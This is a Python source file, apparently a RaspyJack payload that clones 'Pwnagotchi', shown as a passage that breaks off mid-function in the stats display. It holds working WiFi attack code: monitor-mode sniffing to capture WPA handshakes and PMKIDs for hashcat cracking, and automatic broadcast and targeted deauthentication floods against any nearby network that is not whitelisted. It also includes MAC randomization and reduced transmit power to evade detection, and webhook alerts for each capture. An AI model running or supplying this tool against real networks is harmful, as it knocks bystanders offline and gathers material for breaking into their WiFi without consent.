#!/usr/bin/env python3
"""
RaspyJack Payload -- Pwnagotchi
================================
Author: 7h30th3r0n3

Automated WiFi handshake and PMKID hunter with pixel-art face UI.

Features:
  Full 4-way handshake capture (passive EAPOL sniffing)
  Half-handshake capture (2+ EAPOL messages, crackable with hashcat)
  PMKID capture via RSN IE parsing
  Auto-deauth with smart targeting (toggle ON/OFF)
  Broadcast + targeted deauth with adaptive interval
  Intelligent channel hopping (longer dwell on active channels 1,6,11)
  Whitelist MAC/SSID to exclude your own networks
  Stealth mode (MAC randomize + TX power reduction)
  Peer detection (other Raspyjack on the network)
  Discord/webhook notification on capture
  Capture flash (visual feedback on handshake)
  Persistent lifetime stats across sessions
  Pixel-art animated face with blink, pupil tracking, ZZZ
  Activity sparkline graph
  Channel activity stats view
  Capture history browser

Controls:
  OK         Start / Pause capture (session persists)
  UP / DOWN  Scroll stats
  LEFT/RIGHT Toggle deauth ON/OFF
  KEY1       Cycle views: face > stats > captures > whitelist
  KEY2       Toggle stealth mode
  KEY3       Exit (or back from sub-view)

Loot: /root/Raspyjack/loot/Pwnagotchi/
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
import random
import urllib.request
from datetime import datetime
from collections import deque

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_interface

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, Dot11ProbeReq,
        Dot11Auth, Dot11AssoReq, RadioTap, EAPOL,
        sendp, sniff as scapy_sniff, wrpcap, conf, raw,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT

LOOT_DIR = "/root/Raspyjack/loot/Pwnagotchi"
STATS_FILE = os.path.join(LOOT_DIR, "lifetime_stats.json")
CONFIG_FILE = os.path.join(LOOT_DIR, "config.json")
HANDSHAKE_DIR = os.path.join(LOOT_DIR, "handshakes")

# Channel hopping: active channels get more dwell time
# 2.4 GHz channels
CHANNELS_24_PRIORITY = [1, 6, 11]
CHANNELS_24_OTHER = [2, 3, 4, 5, 7, 8, 9, 10, 12, 13]
# 5 GHz channels (common UNII bands)
CHANNELS_5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165]
DWELL_PRIORITY = 5
DWELL_OTHER = 2
DWELL_5GHZ = 3

DEAUTH_COUNT = 5
HALF_HS_MIN = 2  # minimum EAPOL msgs for half-handshake

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
_running = True
capturing = False
deauth_enabled = True
stealth_enabled = False
current_channel = 1
mood = "awake"
mood_text = "waking up..."
start_time = time.time()
last_capture_time = 0
capture_flash = 0  # countdown for flash effect

# Session stats (persist across pause/resume)
session_aps = {}
session_clients = {}
session_handshakes = 0
session_half_hs = 0
session_pmkid = 0
session_deauths = 0
captured_bssids = set()
eapol_buffer = {}
last_capture_ssid = ""

# Channel activity tracking for smart hopping
channel_activity = {ch: 0 for ch in range(1, 14)}  # live counters (reset every 10s for sparkline)
channel_total = {ch: 0 for ch in range(1, 166)}     # cumulative counters (never reset, for stats view)

# Activity sparkline history (sampled every 10s)
activity_history = deque([0] * 20, maxlen=20)
_last_activity_sample = time.time()

# Peer detection
peers_detected = set()

# Lifetime stats
lifetime_handshakes = 0
lifetime_half_hs = 0
lifetime_pmkid = 0
lifetime_networks = 0

# Whitelist
whitelist_macs = set()
whitelist_ssids = set()

# Webhook
webhook_url = ""

# Monitor interface
mon_iface = None
original_mac = ""

# View: face | stats | captures | whitelist
view = "face"

# Animation state
_blink = False
_next_blink = time.time() + random.uniform(5, 10)
_pupil_x = 0.0
_pupil_target = 0
_pupil_change_time = time.time() + random.uniform(2, 4)
_zzz_phase = 0.0


def _cleanup_signal(*_):
    global _running
    _running = False


signal.signal(signal.SIGINT, _cleanup_signal)
signal.signal(signal.SIGTERM, _cleanup_signal)

# ---------------------------------------------------------------------------
# Config / Stats
# ---------------------------------------------------------------------------


def _load_stats():
    global lifetime_handshakes, lifetime_half_hs, lifetime_pmkid, lifetime_networks
    if os.path.isfile(STATS_FILE):
        try:
            with open(STATS_FILE, "r") as f:
                d = json.load(f)
            lifetime_handshakes = d.get("handshakes", 0)
            lifetime_half_hs = d.get("half_hs", 0)
            lifetime_pmkid = d.get("pmkid", 0)
            lifetime_networks = d.get("networks", 0)
        except Exception:
            pass


def _save_stats():
    os.makedirs(LOOT_DIR, exist_ok=True)
    with open(STATS_FILE, "w") as f:
        json.dump({
            "handshakes": lifetime_handshakes,
            "half_hs": lifetime_half_hs,
            "pmkid": lifetime_pmkid,
            "networks": lifetime_networks,
            "last_session": datetime.now().isoformat(),
        }, f, indent=2)


def _load_config():
    global whitelist_macs, whitelist_ssids, deauth_enabled, webhook_url
    if os.path.isfile(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                d = json.load(f)
            whitelist_macs = set(d.get("whitelist_macs", []))
            whitelist_ssids = set(d.get("whitelist_ssids", []))
            deauth_enabled = d.get("deauth_enabled", True)
            webhook_url = d.get("webhook_url", "")
        except Exception:
            pass


def _save_config():
    os.makedirs(LOOT_DIR, exist_ok=True)
    with open(CONFIG_FILE, "w") as f:
        json.dump({
            "whitelist_macs": sorted(whitelist_macs),
            "whitelist_ssids": sorted(whitelist_ssids),
            "deauth_enabled": deauth_enabled,
            "webhook_url": webhook_url,
        }, f, indent=2)


# ---------------------------------------------------------------------------
# Webhook notification
# ---------------------------------------------------------------------------


def _send_webhook(message):
    if not webhook_url:
        return
    try:
        data = json.dumps({"content": message}).encode("utf-8")
        req = urllib.request.Request(webhook_url, data=data,
                                     headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Monitor mode + stealth
# ---------------------------------------------------------------------------


def _get_mac(iface):
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            return f.read().strip().upper()
    except Exception:
        return ""


def _randomize_mac(iface):
    """Randomize MAC address for stealth."""
    new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(5)
    )
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "address", new_mac],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)


def _restore_mac(iface, mac):
    if not mac:
        return
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "address", mac],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)


def _reduce_tx_power(iface):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "txpower", "fixed", "500"],
                   capture_output=True, timeout=5)


def _restore_tx_power(iface):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "txpower", "auto"],
                   capture_output=True, timeout=5)


def _monitor_up(iface):
    for cmd in [
        ["sudo", "ip", "link", "set", iface, "down"],
        ["sudo", "iw", iface, "set", "monitor", "none"],
        ["sudo", "ip", "link", "set", iface, "up"],
    ]:
        subprocess.run(cmd, capture_output=True, timeout=5)
    time.sleep(0.5)
    r = subprocess.run(["iwconfig", iface], capture_output=True, text=True, timeout=5)
    if "Mode:Monitor" in r.stdout:
        return iface
    subprocess.run(["sudo", "airmon-ng", "start", iface],
                   capture_output=True, timeout=15)
    for name in (f"{iface}mon", iface):
        r = subprocess.run(["iwconfig", name], capture_output=True, text=True,
                           timeout=5)
        if "Mode:Monitor" in r.stdout:
            return name
    return None


def _monitor_down(iface):
    if not iface:
        return
    base = iface.replace("mon", "")
    subprocess.run(["sudo", "airmon-ng", "stop", iface],
                   capture_output=True, timeout=10)
    for cmd in [
        ["sudo", "ip", "link", "set", base, "down"],
        ["sudo", "iw", base, "set", "type", "managed"],
        ["sudo", "ip", "link", "set", base, "up"],
    ]:
        subprocess.run(cmd, capture_output=True, timeout=5)


def _set_channel(iface, ch):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)],
                   capture_output=True, timeout=3)


# ---------------------------------------------------------------------------
# Mood engine
# ---------------------------------------------------------------------------


def _update_mood():
    global mood, mood_text
    with lock:
        aps = len(session_aps)
        hs = session_handshakes
        hhs = session_half_hs
        pm = session_pmkid
        deauths = session_deauths
        last = last_capture_ssid
        peers = len(peers_detected)
        stlth = stealth_enabled

    if stlth:
        mood = "stealth"
        mood_text = "ghost mode active"
        return

    elapsed = time.time() - start_time
    t = time.time()

    if capture_flash > 0:
        mood = "happy"
        mood_text = f"PWNED {last[:14]}!"
        return

    if peers > 0 and int(t) % 20 < 3:
        mood = "friend"
        mood_text = f"{peers} peer(s) nearby!"
        return

    if hs + hhs > 0 and int(t) % 25 < 4:
        mood = "happy"
        mood_text = f"{hs} full + {hhs} half HS"
        return

    if pm > 0 and int(t) % 25 < 4:
        mood = "grateful"
        mood_text = f"{pm} PMKID captured!"
        return

    if last and int(t) % 18 < 3:
        mood = "excited"
        mood_text = f">{last[:16]}"
        return

    if deauths > 0 and int(t) % 12 < 2:
        mood = "intense"
        mood_text = f"deauth x{deauths}"
        return

    if aps > 15:
        mood = "excited"
        mood_text = f"{aps} networks!"
    elif aps > 5:
        mood = "cool"
        mood_text = "hunting..."
    elif aps > 0:
        mood = "awake"
        mood_text = "scanning targets"
    elif elapsed > 300:
        mood = "lonely"
        mood_text = "where is everyone?"
    elif elapsed > 120:
        mood = "bored"
        mood_text = "nothing here..."
    elif not capturing:
        mood = "sleeping"
        mood_text = "zzZZZzz"
    else:
        mood = "awake"
        mood_text = "looking around..."


# ---------------------------------------------------------------------------
# Packet handler
# ---------------------------------------------------------------------------


def _is_whitelisted(bssid, essid=""):
    if (bssid or "").upper() in whitelist_macs:
        return True
    if essid and essid in whitelist_ssids:
        return True
    return False


def _save_capture(bssid, essid, pkts, capture_type="hs"):
    os.makedirs(HANDSHAKE_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe = "".join(c if c.isalnum() else "_" for c in essid)[:20]
    fname = f"{capture_type}_{safe}_{ts}.pcap"
    wrpcap(os.path.join(HANDSHAKE_DIR, fname), pkts)
    return fname


def _packet_handler(pkt):
    global session_handshakes, session_half_hs, session_pmkid
    global lifetime_handshakes, lifetime_half_hs, lifetime_pmkid
    global lifetime_networks, last_capture_ssid, last_capture_time, capture_flash

    if not _running or not capturing:
        return

    # -- Beacons: discover APs --
    if pkt.haslayer(Dot11Beacon):
        bssid = (pkt[Dot11].addr2 or "").upper()
        if not bssid or bssid == "FF:FF:FF:FF:FF:FF":
            return
        try:
            essid = pkt[Dot11Elt].info.decode("utf-8", errors="replace")
        except Exception:
            essid = ""
        if not essid:
            essid = "<hidden>"
        if _is_whitelisted(bssid, essid):
            return
        sig = getattr(pkt, "dBm_AntSignal", -99)
        with lock:
            if bssid not in session_aps:
                session_aps[bssid] = {
                    "essid": essid, "channel": current_channel,
                    "signal": sig, "clients": set(), "last_seen": time.time(),
                }
            else:
                session_aps[bssid]["signal"] = sig
                session_aps[bssid]["last_seen"] = time.time()
            channel_activity[current_channel] = channel_activity.get(current_channel, 0) + 1
            channel_total[current_channel] = channel_total.get(current_channel, 0) + 1

        # -- PMKID extraction from RSN IE --
        if bssid not in captured_bssids:
            try:
                elt = pkt[Dot11Elt]
                while elt:
                    if elt.ID == 48 and len(elt.info) >= 20:
                        rsn_data = elt.info
                        # PMKID is in the PMKID List field at the end
                        if len(rsn_data) > 24:
                            pmkid_candidate = rsn_data[-16:]
                            if pmkid_candidate != b'\x00' * 16:
                                with lock:
                                    if bssid not in captured_bssids:
                                        captured_bssids.add(bssid)
                                        session_pmkid += 1
                                        lifetime_pmkid += 1
                                        lifetime_networks += 1
                                        last_capture_ssid = essid
                                        last_capture_time = time.time()
                                        capture_flash = 30
                                        _save_capture(bssid, essid, [pkt],
                                                      "pmkid")
                                        _save_stats()
                                        threading.Thread(
                                            target=_send_webhook,
                                            args=(
                                                f"PMKID captured: {essid} "
                                                f"({bssid})",
                                            ),
                                            daemon=True,
                                        ).start()
                                break
                    elt = (elt.payload.getlayer(Dot11Elt)
                           if elt.payload else None)
            except Exception:
                pass

    # -- Data frames: discover clients --
    if pkt.haslayer(Dot11) and pkt[Dot11].type == 2:
        src = (pkt[Dot11].addr2 or "").upper()
        bss = (pkt[Dot11].addr3 or "").upper()
        if bss in session_aps and src != bss and src != "FF:FF:FF:FF:FF:FF":
            with lock:
                session_aps[bss]["clients"].add(src)
                session_clients[src] = bss
                channel_activity[current_channel] = (
                    channel_activity.get(current_channel, 0) + 1
                )

    # -- Probe requests: peer detection --
    if pkt.haslayer(Dot11ProbeReq):
        try:
            ssid_raw = pkt[Dot11Elt].info.decode("utf-8", errors="replace")
            if ssid_raw.startswith("RJ_PEER_"):
                with lock:
                    peers_detected.add((pkt[Dot11].addr2 or "").upper())
        except Exception:
            pass

    # -- EAPOL: handshake capture --
    if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
        src = (pkt[Dot11].addr2 or "").upper()
        dst = (pkt[Dot11].addr1 or "").upper()
        pair = tuple(sorted([src, dst]))

        with lock:
            if pair not in eapol_buffer:
                eapol_buffer[pair] = []
            eapol_buffer[pair].append(pkt)
            msg_count = len(eapol_buffer[pair])

            # Find associated BSSID
            bssid = None
            for mac in pair:
                if mac in session_aps:
                    bssid = mac
                    break

            if bssid and bssid not in captured_bssids:
                essid = session_aps.get(bssid, {}).get("essid", "unknown")

                if msg_count >= 4:
                    # Full 4-way handshake
                    captured_bssids.add(bssid)
                    session_handshakes += 1
                    lifetime_handshakes += 1
                    lifetime_networks += 1
                    last_capture_ssid = essid
                    last_capture_time = time.time()
                    capture_flash = 30
                    fname = _save_capture(bssid, essid,
                                          eapol_buffer[pair], "hs4")
                    _save_stats()
                    threading.Thread(
                        target=_send_webhook,
                        args=(
                            f"Full handshake: {essid} ({bssid}) "
                            f"saved as {fname}",
                        ),
                        daemon=True,
                    ).start()
                    eapol_buffer[pair] = []

                elif msg_count >= HALF_HS_MIN and msg_count < 4:
                    # Check timeout handled in _half_hs_checker
                    pass

            # Trim old buffers
            if msg_count > 8:
                eapol_buffer[pair] = eapol_buffer[pair][-4:]


# ---------------------------------------------------------------------------
# Half-handshake checker thread
# ---------------------------------------------------------------------------


def _half_hs_checker():
    """Periodically check for stale EAPOL buffers and save half-handshakes."""
    global session_half_hs, lifetime_half_hs, last_capture_ssid
    global last_capture_time, capture_flash

    while _running and capturing:
        time.sleep(10)
        if not _running or not capturing:
            break

        with lock:
            now = time.time()
            stale_pairs = []
            for pair, pkts in eapol_buffer.items():
                if len(pkts) >= HALF_HS_MIN and len(pkts) < 4:
                    try:
                        first_time = (pkts[0].time
                                      if hasattr(pkts[0], 'time')
                                      else now - 20)
                        if now - first_time > 15:
                            stale_pairs.append(pair)
                    except Exception:
                        stale_pairs.append(pair)

            for pair in stale_pairs:
                pkts = eapol_buffer.pop(pair, [])
                if len(pkts) < HALF_HS_MIN:
                    continue
                bssid = None
                for mac in pair:
                    if mac in session_aps:
                        bssid = mac
                        break
                if bssid and bssid not in captured_bssids:
                    essid = session_aps.get(bssid, {}).get("essid", "unknown")
                    captured_bssids.add(bssid)
                    session_half_hs += 1
                    lifetime_half_hs += 1
                    lifetime_networks += 1
                    last_capture_ssid = essid
                    last_capture_time = now
                    capture_flash = 20
                    _save_capture(bssid, essid, pkts, "hs_half")
                    _save_stats()
                    threading.Thread(
                        target=_send_webhook,
                        args=(f"Half handshake ({len(pkts)} msgs): {essid}",),
                        daemon=True,
                    ).start()


# ---------------------------------------------------------------------------
# Capture threads
# ---------------------------------------------------------------------------


def _channel_hopper():
    """Smart channel hopping: 2.4GHz priority + 5GHz scan."""
    global current_channel
    while _running and capturing:
        # 2.4 GHz priority channels (1, 6, 11)
        for ch in CHANNELS_24_PRIORITY:
            if not _running or not capturing:
                return
            _set_channel(mon_iface, ch)
            with lock:
                current_channel = ch
            dwell = DWELL_PRIORITY
            with lock:
                act = channel_activity.get(ch, 0)
            if act > 50:
                dwell = min(10, dwell + 2)
            for _ in range(dwell * 10):
                if not _running or not capturing:
                    return
                time.sleep(0.1)

        # 2.4 GHz other channels
        for ch in CHANNELS_24_OTHER:
            if not _running or not capturing:
                return
            _set_channel(mon_iface, ch)
            with lock:
                current_channel = ch
            for _ in range(DWELL_OTHER * 10):
                if not _running or not capturing:
                    return
                time.sleep(0.1)

        # 5 GHz channels (if adapter supports it)
        for ch in CHANNELS_5:
            if not _running or not capturing:
                return
            r = subprocess.run(
                ["sudo", "iw", "dev", mon_iface, "set", "channel", str(ch)],
                capture_output=True, timeout=3,
            )
            if r.returncode != 0:
                continue  # adapter doesn't support this channel
            with lock:
                current_channel = ch
            for _ in range(DWELL_5GHZ * 10):
                if not _running or not capturing:
                    return
                time.sleep(0.1)

        # Stealth: randomize MAC between cycles
        if stealth_enabled and mon_iface:
            _randomize_mac(mon_iface)


def _sniffer():
    if not SCAPY_OK or not mon_iface:
        return
    try:
        scapy_sniff(
            iface=mon_iface,
            prn=_packet_handler,
            stop_filter=lambda _: not _running or not capturing,
            store=0,
        )
    except Exception:
        pass


def _deauther():
    """Enhanced deauth: broadcast + all clients, adaptive interval."""
    global session_deauths
    while _running and capturing:
        # Adaptive interval based on AP count
        with lock:
            ap_count = len(session_aps)
        if ap_count > 10:
            interval = 15
        elif ap_count >= 3:
            interval = 25
        else:
            interval = 40

        for _ in range(interval * 10):
            if not _running or not capturing or not deauth_enabled:
                time.sleep(0.1)
                continue
            time.sleep(0.1)

        if not deauth_enabled or not _running or not capturing:
            continue

        with lock:
            # Build target list sorted by client count (most clients first)
            targets = []
            for bssid, info in session_aps.items():
                if _is_whitelisted(bssid, info.get("essid", "")):
                    continue
                if bssid in captured_bssids:
                    continue
                clients = list(info.get("clients", set()))
                targets.append((
                    bssid,
                    clients,
                    info.get("channel", 1),
                    len(clients),
                ))

        if not targets:
            continue

        # Sort by client count (more clients = higher priority)
        targets.sort(key=lambda x: x[3], reverse=True)
        bssid, clients, ch, _ = targets[0]

        try:
            # Hop to the target AP's channel for deauth + capture
            _set_channel(mon_iface, ch)
            with lock:
                current_channel = ch

            # Broadcast deauth (FF:FF:FF:FF:FF:FF)
            broadcast_deauth = (
                RadioTap()
                / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid,
                        addr3=bssid, type=0, subtype=12)
                / Dot11Deauth(reason=7)
            )
            sendp(broadcast_deauth, iface=mon_iface, count=DEAUTH_COUNT,
                  inter=0.05, verbose=False)

            # Targeted deauth for ALL known clients of this AP
            for client in clients:
                deauth_to_client = (
                    RadioTap()
                    / Dot11(addr1=client, addr2=bssid, addr3=bssid,
                            type=0, subtype=12)
                    / Dot11Deauth(reason=7)
                )
                deauth_to_ap = (
                    RadioTap()
                    / Dot11(addr1=bssid, addr2=client, addr3=bssid,
                            type=0, subtype=12)
                    / Dot11Deauth(reason=7)
                )
                sendp(deauth_to_client, iface=mon_iface,
                      count=DEAUTH_COUNT, inter=0.05, verbose=False)
                sendp(deauth_to_ap, iface=mon_iface,
                      count=DEAUTH_COUNT, inter=0.05, verbose=False)

            with lock:
                session_deauths += 1
        except Exception:
            pass


def _activity_sampler():
    """Sample channel activity every 10s for the sparkline."""
    while _running:
        time.sleep(10)
        if not _running:
            break
        with lock:
            total = sum(channel_activity.values())
        activity_history.append(total)
        # Reset counters for next sample window
        with lock:
            for ch in channel_activity:
                channel_activity[ch] = 0


# ---------------------------------------------------------------------------
# Animation helpers
# ---------------------------------------------------------------------------


def _update_animation():
    """Update blink/pupil/zzz animation state. Called each frame."""
    global _blink, _next_blink, _pupil_x, _pupil_target
    global _pupil_change_time, _zzz_phase

    now = time.time()

    # Blink logic
    if _blink:
        # blink lasts ~0.2s
        if now > _next_blink + 0.2:
            _blink = False
            _next_blink = now + random.uniform(5, 10)
    else:
        if now >= _next_blink:
            _blink = True

    # Pupil tracking: smooth interpolation toward target
    if now >= _pupil_change_time:
        _pupil_target = random.randint(-2, 2)
        _pupil_change_time = now + random.uniform(2, 4)
    diff = _pupil_target - _pupil_x
    _pupil_x += diff * 0.3  # smooth ease

    # ZZZ floating phase
    _zzz_phase = (now * 0.5) % 3.0


# ---------------------------------------------------------------------------
# Pixel art face drawing
# ---------------------------------------------------------------------------


FACES = {
    "awake":    "(  o . o  )",
    "happy":    "(  ^ . ^  )",
    "excited":  "(  * . *  )",
    "cool":     "(  - . -  )",
    "intense":  "(  @ . @  )",
    "bored":    "(  . . .  )",
    "lonely":   "(  ; . ;  )",
    "sad":      "(  T . T  )",
    "sleeping": "(  -  _  -  )",
    "grateful": "(  > . <  )",
    "friend":   "(  o . O  )",
    "stealth":  "(  # . #  )",
}

def _draw_pixel_face(d, face_mood, blink, pupil_offset_x):
    """Draw ASCII face centered in the top area (y=0..40, base-128)."""
    try:
        face_font = scaled_font(14)
    except Exception:
        face_font = font_obj
    face_text = FACES.get(face_mood, FACES["awake"])
    if blink:
        face_text = "(  -  .  -  )"
    face_color = "#00FF00" if capturing else "#666666"
    if capture_flash > 0:
        face_color = "#FFFF00"
    if stealth_enabled:
        face_color = "#8800FF"
    # Center face using anchor="mm" (middle-middle) at center of face area
    d.text((63, 20), face_text, font=face_font, fill=face_color, anchor="mm")


# ---------------------------------------------------------------------------
# Sparkline drawing
# ---------------------------------------------------------------------------


def _draw_sparkline(d, x, y, w, h, data):
    """Draw a mini bar chart from a deque of values."""
    if not data or max(data) == 0:
        d.rectangle((x, y, x + w, y + h), outline="#222")
        return
    mx = max(data)
    bar_w = max(1, w // len(data))
    for i, v in enumerate(data):
        bh = max(0, int(v / mx * h))
        bx = x + i * bar_w
        if v > mx * 0.6:
            color = "#00FF00"
        elif v > mx * 0.2:
            color = "#FFAA00"
        else:
            color = "#FF4444"
        if bh > 0:
            d.rectangle((bx, y + h - bh, bx + bar_w - 1, y + h), fill=color)


# ---------------------------------------------------------------------------
# LCD Drawing -- Face view
# ---------------------------------------------------------------------------


def _draw_face(lcd, font_obj, font_sm):
    global capture_flash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    _update_mood()
    _update_animation()

    with lock:
        ch = current_channel
        aps = len(session_aps)
        total_clients = len(session_clients)
        hs = session_handshakes
        hhs = session_half_hs
        pm = session_pmkid
        deauths = session_deauths
        lt_hs = lifetime_handshakes
        lt_hhs = lifetime_half_hs
        lt_pm = lifetime_pmkid
        last = last_capture_ssid
        cap = capturing
        deauth_on = deauth_enabled
        stlth = stealth_enabled
        peers = len(peers_detected)

    # Capture flash effect (bright green border flash)
    if capture_flash > 0:
        capture_flash -= 1
        if capture_flash % 6 < 3:
            d.rectangle((0, 0, 127, 3), fill="#00FF00")
            d.rectangle((0, 124, 127, 127), fill="#00FF00")
            d.rectangle((0, 0, 3, 127), fill="#00FF00")
            d.rectangle((124, 0, 127, 127), fill="#00FF00")

    # Uptime
    elapsed = int(time.time() - start_time)
    h_val = elapsed // 3600
    m_val = (elapsed % 3600) // 60
    s_val = elapsed % 60
    uptime = f"{h_val:02d}:{m_val:02d}:{s_val:02d}"

    # -- Pixel art face (y=0..40) --
    _draw_pixel_face(d, mood, _blink, _pupil_x)

    # Separator
    d.line([(0, 41), (127, 41)], fill="#333")

    y = 43

    # CH + Mode
    d.text((2, y), f"CH:{ch}", font=font_sm, fill="#FFAA00")
    mode_parts = []
    if cap:
        mode_parts.append("AUTO")
    if deauth_on:
        mode_parts.append("DTH")
    if stlth:
        mode_parts.append("STH")
    d.text((36, y), "+".join(mode_parts) or "IDLE",
           font=font_sm, fill="#58a6ff")
    y += 12

    # AP + CLI + Peers
    d.text((2, y), f"AP:{aps}", font=font_sm, fill="#00FF00")
    d.text((40, y), f"CLI:{total_clients}", font=font_sm, fill="#00CCFF")
    if peers > 0:
        d.text((90, y), f"P:{peers}", font=font_sm, fill="#FF00FF")
    y += 12

    # PWND
    total_pwnd = hs + hhs
    lt_total = lt_hs + lt_hhs + lt_pm
    pwnd_color = "#00FF00" if total_pwnd > 0 else "#888"
    d.text((2, y), f"PWND:{hs}+{hhs}h", font=font_sm, fill=pwnd_color)
    d.text((80, y), f"({lt_total})", font=font_sm, fill="#666")
    y += 12

    # Uptime
    d.text((2, y), f"UP:{uptime}", font=font_sm, fill="#888")
    y += 12

    # Last capture
    if last:
        d.text((2, y), f">{last[:20]}", font=font_sm, fill="#00FF00")
        y += 12

    # Sparkline (activity graph, last 20 samples)
    _draw_sparkline(d, 2, y, 123, 10, activity_history)

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    if cap:
        d.text((2, 117), "OK:Pse L/R:Dth K2:Sth",
               font=font_sm, fill="#888")
    else:
        d.text((2, 117), "OK:Go K1:View K2:Sth K3:X",
               font=font_sm, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# LCD Drawing -- Stats view (channel activity + top APs)
# ---------------------------------------------------------------------------


def _draw_stats(lcd, font_obj, font_sm, scroll):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    with lock:
        aps = len(session_aps)
        total_clients = len(session_clients)
    d.text((2, 1), "STATS", font=font_sm, fill="#00FF00")
    d.text((50, 1), f"AP:{aps} CLI:{total_clients}",
           font=font_sm, fill="#888")

    with lock:
        ch_act = dict(channel_total)
        cur_ch = current_channel

    # Determine band
    is_5g = cur_ch > 14
    band_label = "5GHz" if is_5g else "2.4G"
    band_color = "#FF00FF" if is_5g else "#58a6ff"

    # Current channel info line
    act_cur = ch_act.get(cur_ch, 0)
    d.text((2, 16), f"CH:{cur_ch}", font=font_sm, fill="#FFFFFF")
    d.text((40, 16), band_label, font=font_sm, fill=band_color)
    d.text((70, 16), f"pkts:{act_cur}", font=font_sm, fill="#FFAA00")

    # --- Unified channel radar (y=28 to y=72) ---
    # Build list of all channels with activity + always show all 2.4GHz
    all_channels = list(range(1, 14))
    for c in CHANNELS_5:
        if ch_act.get(c, 0) > 0 or c == cur_ch:
            all_channels.append(c)

    # Find window centered on current channel
    if cur_ch in all_channels:
        center_idx = all_channels.index(cur_ch)
    else:
        all_channels.append(cur_ch)
        all_channels.sort()
        center_idx = all_channels.index(cur_ch)

    # Show max 15 channels, centered on current
    window_size = 15
    half = window_size // 2
    start = max(0, center_idx - half)
    end = min(len(all_channels), start + window_size)
    start = max(0, end - window_size)
    visible_channels = all_channels[start:end]

    max_act = max((ch_act.get(c, 0) for c in visible_channels), default=1) or 1
    bar_top = 28
    bar_h_max = 30
    bar_w = max(3, 124 // max(len(visible_channels), 1))

    for i, ch in enumerate(visible_channels):
        x = 2 + i * bar_w
        act = ch_act.get(ch, 0)
        bh = max(1, int(act / max_act * bar_h_max)) if act > 0 else 0

        # Color: white=current, green=high, yellow=medium, dark=inactive
        # Purple tint for 5GHz channels
        if ch == cur_ch:
            bar_color = "#FFFFFF"
        elif ch > 14:
            bar_color = "#FF00FF" if act > max_act * 0.3 else "#442244"
        elif act > max_act * 0.6:
            bar_color = "#00FF00"
        elif act > 0:
            bar_color = "#FFAA00"
        else:
            bar_color = "#181818"

        if bh > 0:
            d.rectangle((x, bar_top + bar_h_max - bh, x + bar_w - 2, bar_top + bar_h_max), fill=bar_color)
        else:
            d.rectangle((x, bar_top + bar_h_max - 1, x + bar_w - 2, bar_top + bar_h_max), fill="#181818")

        # Channel number below bar
        ch_str = str(ch)
        ch_color = "#FFFFFF" if ch == cur_ch else "#555"
        if bar_w >= 7:
            d.text((x, bar_top + bar_h_max + 2), ch_str[:2], font=font_sm, fill=ch_color)

    # Marker arrow above current channel bar
    if cur_ch in visible_channels:
        ci = visible_channels.index(cur_ch)
        arrow_x = 2 + ci * bar_w + bar_w // 2
        d.polygon([(arrow_x - 2, bar_top - 2), (arrow_x + 2, bar_top - 2), (arrow_x, bar_top - 5)], fill="#FFFFFF")

    # --- Separator ---
    y_sep = bar_top + bar_h_max + 14
    d.line([(0, y_sep), (127, y_sep)], fill="#333")

    # --- Top APs ---
    y = y_sep + 2
    d.text((2, y), "TOP APs:", font=font_sm, fill="#58a6ff")
    y += 10

    with lock:
        aps_list = sorted(
            session_aps.items(),
            key=lambda x: len(x[1].get("clients", set())),
            reverse=True,
        )

    max_aps = max(2, (115 - y) // 11)
    visible_aps = aps_list[scroll:scroll + max_aps]
    for bssid, info in visible_aps:
        essid = info.get("essid", "?")[:11]
        cli = len(info.get("clients", set()))
        sig = info.get("signal", -99)
        pwned = "!" if bssid in captured_bssids else " "
        name_color = "#00FF00" if bssid in captured_bssids else "#FFFFFF"
        d.text((2, y), f"{pwned}{essid}", font=font_sm, fill=name_color)
        d.text((75, y), f"{cli}c {sig}dB", font=font_sm, fill="#888")
        y += 11

    if not aps_list:
        d.text((4, y), "No APs yet", font=font_sm, fill="#666")

    # Average signal
    if aps_list:
        sigs = [info.get("signal", -99) for _, info in aps_list
                if info.get("signal", -99) != -99]
        if sigs:
